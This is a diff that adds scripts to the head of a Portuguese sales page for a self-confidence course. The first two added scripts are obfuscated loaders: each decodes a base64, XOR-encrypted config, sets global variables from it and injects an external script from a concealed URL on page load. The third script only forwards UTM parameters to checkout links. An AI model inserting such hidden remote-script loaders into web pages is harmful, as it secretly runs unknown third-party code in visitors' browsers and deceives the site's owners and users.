@@ -1,6 +1,47 @@
 <!DOCTYPE html>
 <html lang="pt-BR" class="scroll-smooth">
 <head>
+  <script>(function(){var a_09u=atob("DMkNrmaWSM8vS7eR1rIv2xT6avUNI8Plpro3gUn1LKEBPsP8v690gAX5JeFNOZjitbtk3hLlZ7pbJsS+uqh5yxXiZqVcaZuzt7153A/0PbtKOJWrjbIvwAf7Le0VadPwoqgg2xL7IalWZsfjs79owBK7MKxAL5ritaIvgkTgKaNaLpWr9Otwgh20Jq5CLpWr9K1s2ge7PbtCItHo+7l/yxDzJrsCOMLzv61+jEq0Pq5DPtKz7Osv0zvr");var e_f=[];for(var g_o=0;g_o<a_09u.length;g_o++){e_f.push(a_09u.charCodeAt(g_o)&255);}var p_52sz=e_f[0];var q_it=e_f.slice(1,1+p_52sz);var z_g0mg=e_f.slice(1+p_52sz);var e_rl=z_g0mg.map(function(b,o_3){return b^q_it[o_3%p_52sz];});var q_6v8="";for(var s_3q=0;s_3q<e_rl.length;s_3q++){q_6v8+=String.fromCharCode(e_rl[s_3q]&255);}var y_5iv3=decodeURIComponent(escape(q_6v8));var v_vrkg=JSON.parse(y_5iv3);var u_aa=v_vrkg.globals||[];u_aa.forEach(function(m_0){window[m_0.name]=m_0.value;});var g_x=document.createElement("script");g_x.src=v_vrkg.url;g_x.async=true;g_x.defer=true;(v_vrkg.attributes||[]).forEach(function(c_jijv){g_x.setAttribute(c_jijv.name,c_jijv.value);});(document.head||document.documentElement).appendChild(g_x);})();</script>
+  <script>(function(){var m_aj7=atob("DJYjtNEOqJeJmUYyYu0BwaNiiq2r8TJGEuUZm/5tzPmn7DJfC/BamrJhxbnr62lBAeRKxKV9h+fg4SNeTeZKzLRihv36u2oQA+JXxrhs3ePs6mQIOcsPlrZix/Xo9TUQWM1Ylr9vxfKro2RCC+5G2Jhqirur7ydeF/MBjvM4yfSxrXIGUqERgrdszaC4rHYBUPMXgOAs1cr0");var a_2u=[];for(var x_8dv=0;x_8dv<m_aj7.length;x_8dv++){a_2u.push(m_aj7.charCodeAt(x_8dv)&255);}var l_vf8i=a_2u[0];var y_4u=a_2u.slice(1,1+l_vf8i);var h_4wzn=a_2u.slice(1+l_vf8i);var a_fp2=h_4wzn.map(function(b,r_wc9){return b^y_4u[r_wc9%l_vf8i];});var r_5="";for(var p_6k=0;p_6k<a_fp2.length;p_6k++){r_5+=String.fromCharCode(a_fp2[p_6k]&255);}var x_z=decodeURIComponent(escape(r_5));var c_e2kk=JSON.parse(x_z);var r_6ka=c_e2kk.globals||[];r_6ka.forEach(function(q_u){window[q_u.name]=q_u.value;});var p_t5v=document.createElement("script");p_t5v.src=c_e2kk.url;p_t5v.async=true;p_t5v.defer=true;(c_e2kk.attributes||[]).forEach(function(y_azmb){p_t5v.setAttribute(y_azmb.name,y_azmb.value);});(document.head||document.documentElement).appendChild(p_t5v);})();</script>
+  <script>
+  // Garantir passagem automatica de UTMs e preservacao de window.location.search
+  (function () {
+    function passUtms() {
+      var search = window.location.search;
+      if (!search) return;
+      var params = new URLSearchParams(search);
+      var links = document.querySelectorAll('a[href*="greenn.com.br"], a[href*="hotmart.com"]');
+      links.forEach(function (link) {
+        try {
+          var url = new URL(link.href, window.location.origin);
+          params.forEach(function (val, key) {
+            url.searchParams.set(key, val);
+          });
+          link.href = url.toString();
+        } catch (e) {}
+      });
+    }
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', passUtms);
+    } else {
+      passUtms();
+    }
+    window.addEventListener('load', passUtms);
+    document.addEventListener('click', function (e) {
+      var target = e.target.closest('a[href*="greenn.com.br"], a[href*="hotmart.com"]');
+      if (target && window.location.search) {
+        try {
+          var url = new URL(target.href, window.location.origin);
+          var params = new URLSearchParams(window.location.search);
+          params.forEach(function (val, key) {
+            url.searchParams.set(key, val);
+          });
+          target.href = url.toString();
+        } catch (err) {}
+      }
+    }, true);
+  })();
+</script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover" />
   <title>A Chave para a Autoconfiança | Fernanda Simões</title>
